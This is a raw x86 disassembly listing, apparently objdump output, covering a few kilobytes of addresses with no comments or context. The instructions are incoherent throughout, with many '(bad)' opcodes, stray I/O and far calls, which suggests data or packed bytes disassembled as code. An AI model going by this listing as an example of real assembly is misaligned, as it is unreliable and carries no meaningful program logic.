  424f3d:	rol    DWORD PTR [ecx],0x6d
  424f40:	pop    ebp
  424f41:	lds    eax,FWORD PTR [ebx+0x62]
  424f44:	sub    edi,DWORD PTR [ebx+0x56a06aff]
  424f4a:	aam    0x72
  424f4c:	(bad)  
  424f4d:	call   0xa2bb2a57
  424f52:	(bad)  
  424f53:	imul   ebx,DWORD PTR [ebx-0x360b5dcf],0xffffffe9
  424f5a:	xchg   edx,eax
  424f5b:	xor    al,0x91
  424f5d:	cmp    al,0xa0
  424f5f:	popf   
  424f60:	mov    edx,0x4123edd4
  424f65:	push   ecx
  424f66:	xchg   edx,eax
  424f67:	add    al,0x6e
  424f69:	stc    
  424f6a:	out    dx,al
  424f6b:	pusha  
  424f6c:	adc    edx,edx
  424f6e:	xchg   esp,eax
  424f6f:	pushf  
  424f70:	lea    ebx,[ebx-0x1]
  424f73:	inc    eax
  424f74:	sbb    DWORD PTR [ebx+esi*2],ebx
  424f77:	jge    0x424fe7
  424f79:	mov    edi,0x9ef61ec7
  424f7e:	ret    0xe51
  424f81:	pop    ebp
  424f82:	cli    
  424f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f84:	into   
  424f85:	into   
  424f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f87:	mov    eax,0x2e69cb6b
  424f8c:	inc    eax
  424f8d:	lods   eax,DWORD PTR ds:[esi]
  424f8e:	gs fs jg 0x424f1d
  424f92:	daa    
  424f93:	jmp    0x424f5f
  424f95:	mov    esi,0xb4d640b9
  424f9a:	ds mov ch,0xfb
  424f9d:	cmp    edx,esp
  424f9f:	sar    BYTE PTR [esi+0x14f75020],0x30
  424fa6:	test   DWORD PTR [ebx],ebp
  424fa8:	repz xchg dl,dh
  424fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fac:	pop    eax
  424fad:	das    
  424fae:	out    dx,eax
  424faf:	dec    edx
  424fb0:	ror    DWORD PTR [ebx-0x42a63785],1
  424fb6:	lods   eax,DWORD PTR ds:[esi]
  424fb7:	gs push esi
  424fb9:	in     eax,dx
  424fba:	es jg  0x42500f
  424fbd:	fnstenv [eax]
  424fbf:	xor    edx,DWORD PTR [ecx]
  424fc1:	int3   
  424fc2:	adc    al,0xb1
  424fc4:	and    DWORD PTR [ecx+0x0],ebx
  424fc7:	mov    ecx,0xdcf2b086
  424fcc:	dec    esp
  424fcd:	(bad)  
  424fce:	ret    
  424fcf:	jge    0x42503f
  424fd1:	adc    cl,BYTE PTR [edx+0x66]
  424fd4:	and    DWORD PTR [edi+0x7f],edi
  424fd7:	sbb    eax,DWORD PTR [ebp+0x5a]
  424fda:	sbb    BYTE PTR [ebx-0x23],0x1c
  424fde:	mov    ds:0x407427d0,eax
  424fe3:	icebp  
  424fe4:	pop    ds
  424fe5:	call   0x8326:0x22d2c8b8
  424fec:	fisub  DWORD PTR [edx]
  424fee:	mov    ebx,0xf0fdc0b6
  424ff3:	xchg   edx,eax
  424ff4:	xchg   cl,dl
  424ff6:	scas   eax,DWORD PTR es:[edi]
  424ff7:	lods   eax,DWORD PTR ds:[esi]
  424ff8:	adc    edx,0xffffffe7
  424ffb:	inc    edi
  424ffc:	add    al,0xc
  424ffe:	push   ecx
  424fff:	push   0x46d765d2
  425004:	fldenv [edi-0x2ea2761b]
  42500a:	lods   eax,DWORD PTR ds:[esi]
  42500b:	jg     0x424fc9
  42500d:	push   esp
  42500e:	xchg   ebp,eax
  42500f:	shl    BYTE PTR [edi-0x3e],cl
  425012:	push   esi
  425013:	sti    
  425014:	dec    edx
  425015:	clc    
  425016:	sub    al,0xcb
  425018:	xchg   ebx,eax
  425019:	mov    dl,0x93
  42501b:	or     ebx,ecx
  42501d:	ret    0x2038
  425020:	(bad)  
  425021:	in     al,dx
  425022:	adc    bh,BYTE PTR ss:[ebp-0x5487690a]
  425029:	pop    esi
  42502a:	fs push ds
  42502c:	sbb    ch,bh
  42502e:	sti    
  42502f:	sbb    al,BYTE PTR [edi-0x33a0ec21]
  425035:	gs jns 0x425052
  425038:	dec    eax
  425039:	add    bl,BYTE PTR [edi-0x163467d4]
  42503f:	lea    edx,[eax]
  425041:	mov    cl,0xfe
  425043:	and    BYTE PTR ds:0x14de899d,dh
  425049:	(bad)  
  42504a:	and    eax,0x81ba69c0
  42504f:	xor    edx,DWORD PTR [eax+0x390c3f46]
  425055:	jge    0x425032
  425057:	unpckhps xmm1,xmm6
  42505a:	jle    0x425084
  42505c:	cmp    al,0x46
  42505e:	(bad)  
  42505f:	lds    ecx,FWORD PTR [edi]
  425061:	mov    edx,0xccdf45a0
  425066:	data16 je 0x425018
  425069:	mov    bh,0xce
  42506b:	xor    ebp,ebx
  42506d:	ret    
  42506e:	push   ss
  42506f:	mov    DWORD PTR [ecx],edi
  425071:	fstp   DWORD PTR [ebx-0x503ded3]
  425077:	xchg   edi,eax
  425078:	stos   DWORD PTR es:[edi],eax
  425079:	lods   eax,DWORD PTR ds:[esi]
  42507a:	sbb    ch,BYTE PTR [esi]
  42507c:	inc    esp
  42507d:	push   0x5a943eb8
  425082:	jmp    0x4250c5
  425084:	and    edi,DWORD PTR [esi]
  425086:	stc    
  425087:	or     BYTE PTR [ecx-0xd],dh
  42508a:	adc    eax,0x794d5ee8
  42508f:	dec    ebp
  425090:	ds inc ebx
  425092:	inc    eax
  425093:	xchg   esp,eax
  425094:	fs dec eax
  425096:	je     0x425104
  425098:	push   esi
  425099:	pop    esp
  42509a:	push   0xffffff84
  42509c:	sub    al,0x74
  42509e:	add    dl,BYTE PTR [eax]
  4250a0:	adc    DWORD PTR [ebp-0x2e72682e],esi
  4250a6:	mov    ebx,0x11d66f33
  4250ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250ac:	div    DWORD PTR [esi+eiz*4+0x14b10ec]
  4250b3:	inc    esp
  4250b4:	and    ebp,esp
  4250b6:	out    0xd5,eax
  4250b8:	dec    esp
  4250b9:	jo     0x42504c
  4250bb:	sub    ebp,DWORD PTR [ebx*2-0x49b3c415]
  4250c2:	add    esi,DWORD PTR [edx]
  4250c4:	hlt    
  4250c5:	mov    WORD PTR [ebx+0x45164eaa],fs
  4250cb:	aam    0xc7
  4250cd:	jle    0x4250a9
  4250cf:	jecxz  0x42511c
  4250d1:	jecxz  0x425074
  4250d3:	sub    al,0x5d
  4250d5:	dec    edi
  4250d6:	jle    0x425153
  4250d8:	das    
  4250d9:	sar    ecx,1
  4250db:	(bad)  
  4250dd:	cmp    ch,BYTE PTR ss:[ebp-0x37c9cb9b]
  4250e4:	cs cwde 
  4250e6:	adc    eax,edi
  4250e8:	loop   0x4250f6
  4250ea:	jl     0x4250a4
  4250ec:	jp     0x42514b
  4250ee:	sub    eax,0xc5c6067d
  4250f3:	fst    QWORD PTR [ebp-0x3e]
  4250f6:	push   cs
  4250f7:	sbb    DWORD PTR [edx+edi*1],edx
  4250fa:	mov    dh,ah
  4250fc:	dec    eax
  4250fd:	mov    edx,DWORD PTR ds:0x774dfe05
  425103:	scas   eax,DWORD PTR es:[edi]
  425104:	and    eax,0xc0338f71
  425109:	dec    ebp
  42510a:	inc    eax
  42510b:	cmp    al,0xb6
  42510d:	inc    edx
  42510e:	xor    edi,DWORD PTR [ecx]
  425110:	fst    st(1)
  425112:	mov    dl,0x86
  425114:	pushf  
  425115:	xor    ecx,DWORD PTR [edi-0x4]
  425118:	or     al,0xf8
  42511a:	(bad)  
  42511b:	ret    0x9f3c
  42511e:	lock mov dl,0x13
  425121:	mov    al,0x63
  425123:	dec    esi
  425124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425125:	and    al,0xa8
  425127:	sbb    DWORD PTR [edi-0x1c],ebp
  42512a:	xor    BYTE PTR [eax+0x52],ah
  42512d:	shl    DWORD PTR [ebx+0x5d],cl
  425130:	daa    
  425131:	int3   
  425132:	fnstenv [ebx-0x3e]
  425135:	mov    ds:0x4da83cde,al
  42513a:	push   edx
  42513b:	jmp    0x42515a
  42513d:	sbb    edi,edx
  42513f:	inc    eax
  425140:	and    DWORD PTR [eax+0x26],0xffffffd8
  425144:	mov    ah,BYTE PTR ds:0x100c3b42
  42514a:	bound  ecx,QWORD PTR [esi-0x2da4748]
  425150:	cs pop esp
  425152:	shr    DWORD PTR [ebp-0x3295d5b3],0x5c
  425159:	dec    ebx
  42515a:	mov    ebx,0x447f5ac6
  42515f:	sub    esp,eax
  425161:	sbb    eax,DWORD PTR ds:0xcd20b9f1
  425167:	jle    0x42515a
  425169:	test   eax,0x4c5a68e3
  42516e:	sbb    BYTE PTR [eax-0x32],dh
  425171:	add    BYTE PTR [edi+0xe],dl
  425174:	push   ss
  425175:	push   ecx
  425176:	cmp    dl,dl
  425178:	in     eax,0xbe
  42517a:	jp     0x42513b
  42517c:	add    ecx,eax
  42517e:	xchg   ebx,eax
  42517f:	imul   eax,DWORD PTR [esi+0x54b84d1d],0x6219e34
  425189:	fs jmp 0x39c0167c
  42518f:	xchg   BYTE PTR [ecx+0x67],ah
  425192:	jae    0x42520a
  425194:	jmp    0x0:0x50c1
  42519b:	add    BYTE PTR [eax],al
  42519d:	add    BYTE PTR [eax],al
  42519f:	add    BYTE PTR [eax],al
  4251a1:	imul   edi,DWORD PTR [esi-0x480049c5],0x4a7bffed
  4251ab:	dec    ecx
  4251ac:	pop    ecx
  4251ad:	push   0x57e9d582
  4251b2:	leave  
  4251b3:	add    DWORD PTR [eax],eax
  4251b5:	scas   al,BYTE PTR es:[edi]
  4251b6:	add    eax,DWORD PTR [eax]
  4251b8:	add    BYTE PTR [ebx-0xc],bl
  4251bb:	dec    esi
  4251bc:	int3   
  4251bd:	inc    ecx
  4251be:	push   ecx
  4251bf:	sbb    bh,BYTE PTR [ecx-0x2]
  4251c2:	jmp    0x39539f3a
  4251c7:	repnz mov cl,0xa6
  4251ca:	mov    ds:0xc41063d0,al
  4251cf:	test   al,al
  4251d1:	dec    esp
  4251d2:	fwait
  4251d3:	iret   
  4251d4:	jne    0x425180
  4251d6:	dec    edi
  4251d7:	cmp    DWORD PTR [edi+0x28],ebx
  4251da:	push   edi
  4251db:	mov    edi,0x45b24401
  4251e0:	cwde   
  4251e1:	push   ecx
  4251e2:	add    bl,BYTE PTR [ebp+esi*8+0x4e]
  4251e6:	out    0x7d,eax
  4251e8:	adc    DWORD PTR [ecx+0x23b9dddf],edx
  4251ee:	jge    0x425266
  4251f0:	sbb    DWORD PTR [eax-0x622cd828],edx
  4251f6:	rol    DWORD PTR [edx+0x54],cl
  4251f9:	mov    dh,0xbe
  4251fb:	ret    
  4251fc:	int3   
  4251fd:	mov    esp,0x777f4f7d
  425202:	cli    
  425203:	xchg   esp,eax
  425204:	in     eax,0xd1
  425206:	jecxz  0x4251e5
  425208:	in     eax,dx
  425209:	repz jecxz 0x425195
  42520c:	iret   
  42520d:	jmp    0xf65fbbd9
  425212:	xor    BYTE PTR [ecx+0x63],0x59
  425216:	outs   dx,BYTE PTR ds:[esi]
  425217:	mov    ds:0x68356833,eax
  42521c:	mov    al,0x59
  42521e:	sti    
  42521f:	inc    eax
  425220:	out    0x2e,al
  425222:	sahf   
  425223:	cs xchg esp,eax
  425225:	xor    al,0xf2
  425227:	outs   dx,DWORD PTR ds:[esi]
  425228:	loope  0x42529d
  42522a:	push   eax
  42522b:	or     al,0x38
  42522d:	ss mov al,0xeb
  425230:	sub    bl,BYTE PTR [ebx+0x31f95f66]
  425236:	xor    eax,eax
  425238:	push   edx
  425239:	fs imul ecx,esp,0x19a55064
  425240:	pop    ebp
  425241:	mov    ah,0x9d
  425243:	xor    eax,0xc86f1d23
  425248:	pop    ds
  425249:	mov    bl,0x9e
  42524b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42524c:	enter  0xefe2,0xc8
  425250:	inc    esp
  425251:	leave  
  425252:	sbb    eax,0x92d31def
  425257:	jmp    0xee8165b9
  42525c:	int    0x8e
  42525e:	stc    
  42525f:	adc    eax,0x793bfe6f
  425264:	jmp    0x4252a8
  425266:	cmp    al,0xa6
  425268:	sub    DWORD PTR [esi-0x6c56158d],ebp
  42526e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42526f:	pop    eax
  425270:	fs push eax
  425272:	jno    0x4252de
  425274:	out    dx,al
  425275:	xor    al,0x69
  425277:	je     0x4252df
  425279:	outs   dx,DWORD PTR ds:[esi]
  42527a:	cwde   
  42527b:	push   es
  42527c:	and    BYTE PTR [edi-0x3ee3ff79],ch
  425282:	scas   eax,DWORD PTR es:[edi]
  425283:	pop    es
  425284:	(bad)  
  425285:	icebp  
  425286:	jae    0x42521a
  425288:	mov    ecx,0x5830036e
  42528d:	xchg   ebp,eax
  42528e:	nop
  42528f:	adc    al,0x89
  425291:	stc    
  425292:	adc    DWORD PTR [esp+eax*4],ebp
  425295:	pushf  
  425296:	xor    DWORD PTR [esi],esp
  425298:	jg     0x425264
  42529a:	mov    ds:0xbf5e8f09,eax
  42529f:	jb     0x42530f
  4252a1:	test   DWORD PTR [eax],esi
  4252a3:	cs loopne 0x42529c
  4252a6:	jno    0x42528e
  4252a8:	jne    0x4252d4
  4252aa:	fcom   QWORD PTR [edi+ebx*1+0x65530262]
  4252b1:	push   0x21
  4252b3:	call   0xa1388a18
  4252b8:	arpl   sp,ax
  4252ba:	jne    0x42530f
  4252bc:	push   eax
  4252bd:	sti    
  4252be:	add    ebx,esi
  4252c0:	in     eax,0x3b
  4252c2:	int3   
  4252c3:	fcomi  st,st(7)
  4252c5:	pop    es
  4252c6:	mov    dl,dl
  4252c8:	pop    esp
  4252c9:	loopne 0x425306
  4252cb:	xchg   esi,eax
  4252cc:	cmp    DWORD PTR [eax],ebx
  4252ce:	popa   
  4252cf:	dec    ebp
  4252d0:	retf   
  4252d1:	mov    esp,0xa5f9e653
  4252d6:	(bad)  [edi+0x1d4064c]
  4252dc:	add    esp,ebp
  4252de:	dec    edx
  4252df:	dec    edi
  4252e0:	loopne 0x42531f
  4252e2:	shl    DWORD PTR [ebp-0x51],cl
  4252e5:	sbb    al,0x48
  4252e7:	imul   ecx,ebx,0xaaf2b871
  4252ed:	cld    
  4252ee:	mov    ebp,0x78bd8a43
  4252f3:	adc    eax,0xdf4fef15
  4252f8:	repz mov WORD PTR [esi-0x1b],?
  4252fc:	fiadd  DWORD PTR [eax-0x608939fe]
  425302:	call   0xaeb8ccd2
  425307:	js     0x4252be
  425309:	call   0xd574:0x45fb54c5
  425310:	in     eax,0x7a
  425312:	add    eax,0xcb0a4de4
  425317:	pop    eax
  425318:	adc    DWORD PTR [ecx+0x30c3dbe0],eax
  42531e:	and    eax,DWORD PTR [esi]
  425320:	ret    0x490b
  425323:	mov    bh,0xc7
  425325:	and    esi,eax
  425327:	(bad)  
  425328:	mov    ebx,0x23e408bf
  42532d:	ins    DWORD PTR es:[edi],dx
  42532e:	add    BYTE PTR [edi],0xc5
  425331:	push   esp
  425332:	cli    
  425333:	fldcw  WORD PTR [ecx+0x19656e51]
  425339:	or     al,0x1f
  42533b:	xlat   BYTE PTR ds:[ebx]
  42533c:	cmc    
  42533d:	mov    edx,?
  42533f:	jbe    0x425346
  425341:	add    eax,DWORD PTR [esi-0x58d032e0]
  425347:	test   BYTE PTR ds:0xd58b393f,dl
  42534d:	xlat   BYTE PTR ds:[ebx]
  42534e:	iret   
  42534f:	sbb    eax,0xc60939b
  425354:	fsubr  DWORD PTR [eax+0x43af1403]
  42535a:	dec    edi
  42535b:	cs xchg ecx,eax
  42535d:	pop    es
  42535e:	inc    ecx
  42535f:	mov    bl,0x91
  425361:	sub    BYTE PTR [edi-0x7ba26c18],ah
  425367:	repnz imul ebp,DWORD PTR [ecx+0x7bc2e612],0x3eb8a27e
  425372:	dec    eax
  425373:	inc    eax
  425374:	ret    0xe067
  425377:	loopne 0x425300
  425379:	or     ebp,ebx
  42537b:	adc    eax,0x690e889
  425380:	mov    ds:0xecda8d5c,al
  425385:	sbb    BYTE PTR [esi+edx*1-0x5d],0x78
  42538a:	jae    0x425385
  42538c:	fdivr  st(0),st
  42538e:	cld    
  42538f:	fs ins DWORD PTR es:[edi],dx
  425391:	mov    esp,0xb0df5352
  425396:	sbb    edx,DWORD PTR [eax-0x631985f]
  42539c:	add    eax,0xbcc1a04e
  4253a1:	or     DWORD PTR [ebx+0x5eda167c],0xffffffce
  4253a8:	pop    ss
  4253a9:	retf   
  4253aa:	mov    cl,0x2c
  4253ac:	(bad)  
  4253ad:	(bad)  [eax-0x22]
  4253b0:	(bad)  
  4253b1:	mov    eax,ds:0x49e098cc
  4253b6:	test   bh,0x1d
  4253b9:	call   0xf65b:0x9b107620
  4253c0:	sbb    BYTE PTR [eax],bh
  4253c2:	ins    DWORD PTR es:[edi],dx
  4253c3:	mov    esp,0xd6d75b40
  4253c8:	jb     0x425445
  4253ca:	scas   al,BYTE PTR es:[edi]
  4253cb:	mov    dh,BYTE PTR [ebx-0x20]
  4253ce:	inc    esp
  4253cf:	repnz pop ecx
  4253d1:	cmp    al,0x2a
  4253d3:	int3   
  4253d4:	daa    
  4253d5:	mov    ah,0x7d
  4253d7:	adc    esp,ebx
  4253d9:	or     eax,0xc3ff7c20
  4253de:	jne    0x4253bf
  4253e0:	jbe    0x42543e
  4253e2:	dec    ebp
  4253e3:	(bad)  
  4253e4:	(bad)  
  4253e5:	dec    ebp
  4253e6:	push   ds
  4253e7:	and    DWORD PTR [edx],esp
  4253e9:	adc    ah,cl
  4253eb:	add    cl,al
  4253ed:	mov    cl,0xf9
  4253ef:	push   ecx
  4253f0:	push   ecx
  4253f1:	sahf   
  4253f2:	mov    dh,0x17
  4253f4:	sub    BYTE PTR [edx-0x32d173fc],dl
  4253fa:	imul   esi,edx,0xa06aa151
  425400:	push   ds
  425401:	or     eax,DWORD PTR [eax+0x13]
  425404:	int3   
  425405:	loope  0x425430
  425407:	gs stos BYTE PTR es:[edi],al
  425409:	iret   
  42540a:	lea    edx,gs:[ecx+edi*1+0x61]
  42540f:	or     BYTE PTR [ecx],cl
  425411:	ss and ch,al
  425414:	adc    ch,BYTE PTR [edx-0x3a4ba6bd]
  42541a:	mul    edx
  42541c:	push   ebp
  42541d:	cld    
  42541e:	(bad)  
  425420:	jmp    0x4253d1
  425422:	jo     0x425463
  425424:	cwde   
  425425:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425427:	jmp    0xe67e2795
  42542c:	bound  edx,QWORD PTR [ebp-0x7d]
  42542f:	das    
  425430:	loop   0x425460
  425432:	in     al,dx
  425433:	or     BYTE PTR [ecx],0x10
  425436:	inc    ecx
  425438:	mov    al,0x1
  42543a:	loopne 0x42545a
  42543c:	lock dec ecx
  42543e:	cmp    DWORD PTR [ebx],esi
  425440:	mov    es,WORD PTR [esi-0x71]
  425443:	das    
  425444:	jno    0x4253f3
  425446:	inc    ecx
  425447:	jmp    0x5227eb50
  42544c:	pop    ebx
  42544d:	fnsave [esi+esi*2-0x27212257]
  425454:	adc    esp,esp
  425456:	mov    dh,0x9a
  425458:	in     al,dx
  425459:	(bad)  
  42545a:	nop
  42545b:	hlt    
  42545c:	adc    eax,0x73ab1c8b
  425461:	dec    edi
  425462:	mov    bl,0xab
  425464:	fisubr WORD PTR [edi-0x35]
  425467:	xor    bl,0x44
  42546a:	fsubr  DWORD PTR [ecx]
  42546c:	jge    0x425417
  42546e:	inc    esp
  42546f:	adc    eax,0x69b66a4c
  425474:	es repz push edx
  425477:	cdq    
  425478:	mov    ch,0x61
  42547a:	sti    
  42547b:	or     ecx,DWORD PTR [ecx-0x43ed7851]
  425481:	push   ebp
  425482:	pop    eax
  425483:	mov    dh,0x36
  425485:	or     eax,0x8ffe9c86
  42548a:	dec    edi
  42548b:	xchg   edi,eax
  42548c:	xchg   edx,eax
  42548d:	xor    BYTE PTR [ebx+ecx*1-0x4a],dh
  425491:	or     ecx,DWORD PTR [esi+edx*1]
  425494:	xchg   edx,eax
  425495:	add    ch,BYTE PTR [eax-0x594c905d]
  42549b:	cs popa 
  42549d:	xor    bh,BYTE PTR [ebp-0x19]
  4254a0:	enter  0xbced,0x34
  4254a4:	mov    ecx,0x14595595
  4254a9:	jns    0x42550b
  4254ab:	mov    cl,0xc
  4254ad:	mov    eax,ds:0x4ecd7b09
  4254b2:	(bad)  
  4254b3:	fiadd  DWORD PTR [eax+0x16]
  4254b6:	ins    DWORD PTR es:[edi],dx
  4254b7:	and    eax,0x13fccd82
  4254bc:	mov    esi,0xeb16ae32
  4254c1:	jmp    0x39991c1c
  4254c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254c7:	lahf   
  4254c8:	stos   BYTE PTR es:[edi],al
  4254c9:	aam    0x8b
  4254cb:	xchg   edi,eax
  4254cc:	retf   0x8b56
  4254cf:	pop    ds
  4254d0:	xchg   BYTE PTR [esi+0x69752704],ch
  4254d6:	mov    ebp,0x819f50a6
  4254db:	out    0x96,al
  4254dd:	test   DWORD PTR [ebx+0x7dbc8d3c],esi
  4254e3:	outs   dx,DWORD PTR ds:[esi]
  4254e4:	jp     0x425490
  4254e6:	sub    eax,DWORD PTR [ebp+edx*8+0x3fc32b5d]
  4254ed:	push   ebp
  4254ee:	xor    al,BYTE PTR [edx+edx*8]
  4254f1:	aas    
  4254f2:	(bad)  
  4254f4:	push   ebx
  4254f5:	mov    fs,WORD PTR [ebx+0x154b559c]
  4254fb:	in     al,0x63
  4254fd:	mov    eax,0x69908cc9
  425502:	cmp    BYTE PTR [ecx-0x72],ch
  425505:	js     0x4254c5
  425507:	retf   0x5857
  42550a:	add    BYTE PTR ds:0xf49d2f30,ch
  425510:	push   0x6850bb88
  425515:	push   ebx
  425516:	or     BYTE PTR [ecx],0xbc
  425519:	lods   eax,DWORD PTR ds:[esi]
  42551a:	push   ecx
  42551b:	dec    esi
  42551c:	and    BYTE PTR [eax],dh
  42551e:	sub    eax,0xe9f24edf
  425523:	jns    0x42551e
  425525:	or     cl,dl
  425527:	push   0x38
  425529:	retf   0xb90
  42552c:	jmp    0x34ec24f6
  425531:	xchg   ecx,eax
  425532:	push   ebp
  425533:	dec    esp
  425534:	jb     0x42553b
  425536:	fwait
  425537:	lahf   
  425538:	dec    esp
  425539:	xchg   DWORD PTR [esi],edx
  42553b:	jo     0x425562
  42553d:	inc    esi
  42553e:	pop    esi
  42553f:	std    
  425540:	fbstp  TBYTE PTR [eax]
  425542:	stos   BYTE PTR es:[edi],al
  425543:	loop   0x425566
  425545:	hlt    
  425546:	and    al,0x7a
  425548:	je     0x42552d
  42554a:	mov    al,0xe9
  42554c:	push   0xa046451d
  425551:	movaps XMMWORD PTR [edi],xmm5
  425554:	sub    al,0x67
  425556:	xor    DWORD PTR [edx+0x2ad24798],0xc9222042
  425560:	mov    al,ds:0x255821d9
  425565:	(bad)  
  425566:	stc    
	...
  42556f:	add    BYTE PTR [eax],al
  425571:	jmp    0x4255bb
  425573:	or     al,0xc7
  425575:	scas   eax,DWORD PTR es:[edi]
  425576:	(bad)  
  425577:	jmp    0x4255e5
  425579:	popa   
  42557a:	mov    cl,ch
  42557c:	or     esi,esp
  42557e:	scas   al,BYTE PTR es:[edi]
  42557f:	and    bh,BYTE PTR [esi+0x1cd05]
  425585:	scas   al,BYTE PTR es:[edi]
  425586:	add    eax,DWORD PTR [eax]
  425588:	add    BYTE PTR [ebp+0x7ca2b6b9],al
  42558e:	into   
  42558f:	mov    ecx,0x4a64318
  425594:	in     al,dx
  425595:	ss addr16 repz adc eax,0x20fb26b9
  42559d:	xor    DWORD PTR [edx+edx*4-0x68b3fdcc],esp
  4255a4:	call   0x5862:0xb6016b5f
  4255ab:	imul   DWORD PTR [eax-0x46ceab60]
  4255b1:	or     al,0x2
  4255b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255b4:	cmp    eax,0x4850996d
  4255b9:	sar    DWORD PTR [ebx-0x33],cl
  4255bc:	push   es
  4255bd:	div    BYTE PTR [ebp+esi*4-0x6cae3b06]
  4255c4:	adc    ecx,ebx
  4255c6:	ret    0xcb86
  4255c9:	xchg   esp,eax
  4255ca:	frstor [ecx-0x5c]
  4255cd:	add    BYTE PTR [esi+0x6fc78e1b],ch
  4255d3:	fcmovne st,st(3)
  4255d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255d6:	jecxz  0x425645
  4255d8:	call   0x75b2:0x30e92025
  4255df:	ret    
  4255e0:	out    0xdf,eax
  4255e2:	xchg   ebx,eax
  4255e3:	pushf  
  4255e4:	ret    
  4255e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255e6:	add    eax,0x86400f4b
  4255eb:	mov    dl,BYTE PTR [edi-0x2a7b83b8]
  4255f1:	xor    al,0x4c
  4255f3:	in     eax,0x2
  4255f5:	add    BYTE PTR [ebp+0x22],cl
  4255f8:	sbb    ebx,DWORD PTR [ecx]
  4255fa:	adc    DWORD PTR ds:0x9d08e123,eax
  425600:	call   0xfc70:0x5d20fb66
  425607:	pop    esi
  425608:	loopne 0x4255cf
  42560a:	mov    cl,0xe3
  42560c:	xlat   BYTE PTR ds:[ebx]
  42560d:	aaa    
  42560e:	add    eax,0xa5681fa6
  425613:	out    0xde,eax
  425615:	mov    al,0xa9
  425617:	jno    0x425626
  425619:	mov    eax,ds:0x97a6b7a3
  42561e:	lahf   
  42561f:	cmp    al,0x76
  425621:	pop    ebx
  425622:	or     edx,DWORD PTR [ebx+0x5f0166cb]
  425628:	imul   esp,DWORD PTR [edx-0x53],0x25e8b7e3
  42562f:	iret   
  425630:	mov    bh,0x41
  425633:	pop    eax
  425634:	cmp    BYTE PTR [ebx+0x52f694cb],bl
  42563a:	dec    edx
  42563b:	(bad)  
  42563d:	or     DWORD PTR [edi+0x16],edi
  425640:	ffreep st(0)
  425642:	outs   dx,DWORD PTR ds:[esi]
  425643:	jmp    0x425667
  425645:	push   cs
  425646:	push   0xffffff81
  425648:	ret    
  425649:	mov    dh,0x4
  42564b:	das    
  42564c:	ja     0x425601
  42564e:	(bad)  
  42564f:	addr16 mov al,0xe0
  425652:	jo     0x425689
  425654:	scas   eax,DWORD PTR es:[edi]
  425655:	out    dx,eax
  425656:	lds    esi,FWORD PTR [edi-0x6a]
  425659:	int3   
  42565a:	imul   bl
  42565c:	stos   DWORD PTR es:[edi],eax
  42565d:	inc    esi
  42565e:	jecxz  0x4256b0
  425660:	rcr    BYTE PTR [eax-0x4b],1
  425663:	pop    esp
  425664:	mov    al,ds:0x46def1c1
  425669:	adc    DWORD PTR [eax-0x58],esi
  42566c:	xor    DWORD PTR [ebx+0x35],esi
  42566f:	add    al,BYTE PTR [ebx+ebx*1]
  425672:	or     al,0xb1
  425674:	rol    BYTE PTR [edi],0x51
  425677:	xor    al,0x76
  425679:	sbb    eax,0xb919b58a
  42567e:	add    ah,BYTE PTR [edx+0x5d6b806a]
  425684:	bound  edi,QWORD PTR [edi+0x1c918900]
  42568a:	test   al,0xf9
  42568c:	cmp    BYTE PTR [eax+0x60],0x85
  425690:	(bad)  [eax+0x70]
  425693:	adc    BYTE PTR [esi],0xd9
  425696:	inc    edi
  425697:	stos   DWORD PTR es:[edi],eax
  425698:	sar    DWORD PTR [ebx-0x4c823f18],cl
  42569e:	sbb    BYTE PTR [ebp+0x6810dd00],0xe2
  4256a5:	push   ebx
  4256a6:	popa   
  4256a7:	fdivr  st,st(0)
  4256a9:	test   eax,0xb0f61e53
  4256ae:	lods   eax,DWORD PTR ds:[esi]
  4256af:	stos   BYTE PTR es:[edi],al
  4256b0:	loop   0x42563c
  4256b2:	xchg   ebx,ecx
  4256b4:	repz hlt 
  4256b6:	xor    bl,BYTE PTR [ebx+0x6b]
  4256b9:	iret   
  4256ba:	xor    dh,BYTE PTR [edi+0x55]
  4256bd:	(bad)  
  4256be:	ins    BYTE PTR es:[edi],dx
  4256bf:	test   al,0xca
  4256c1:	fdivr  st(6),st
  4256c3:	or     esp,DWORD PTR [ebx+0x1e]
  4256c6:	jb     0x4256f4
  4256c8:	in     eax,dx
  4256c9:	push   0xfffffff7
  4256cb:	cmp    BYTE PTR [ebx+esi*8-0x67],bh
  4256cf:	jmp    0xba25afe2
  4256d4:	mov    esp,0x3ad3bddb
  4256d9:	dec    eax
  4256da:	mov    ds:0x66ad9cc6,eax
  4256df:	mov    ah,0x13
  4256e1:	xor    al,0xff
  4256e3:	and    BYTE PTR [eax+0x2afe7643],al
  4256e9:	mov    ecx,DWORD PTR [ebp-0x21d5bc7d]
  4256ef:	(bad)  
  4256f0:	jl     0x425675
  4256f2:	rol    ebp,1
  4256f4:	enter  0x9db7,0xf8
  4256f8:	fs (bad) 
  4256fb:	sub    ah,BYTE PTR [esi]
  4256fd:	in     al,0x2e
  4256ff:	stos   BYTE PTR es:[edi],al
  425700:	xor    BYTE PTR [ebx-0x767d9d37],bl
  425706:	test   eax,0x70af32ae
  42570b:	sbb    ch,BYTE PTR [edi-0x79e5f40b]
  425711:	xor    BYTE PTR [ebx],ch
  425713:	sub    DWORD PTR [esi+0x766a6ce2],ebx
  425719:	or     eax,0x29774074
  42571e:	ins    DWORD PTR es:[edi],dx
  42571f:	sbb    eax,0x6cf064e8
  425724:	pop    ss
  425725:	or     DWORD PTR [eax-0xfcd711f],ebx
  42572b:	pop    ebp
  42572c:	shl    DWORD PTR [ecx],1
  42572e:	dec    ecx
  42572f:	cmc    
  425730:	push   esi
  425731:	xor    esp,edx
  425733:	ss xchg ebp,eax
  425735:	push   esi
  425736:	add    DWORD PTR [esi+0x3e],esp
  425739:	les    edx,FWORD PTR [edx]
  42573b:	test   BYTE PTR ds:0xf8178b16,ch
  425741:	fld    st(6)
  425743:	adc    DWORD PTR [eax+0x7c1f7fea],eax
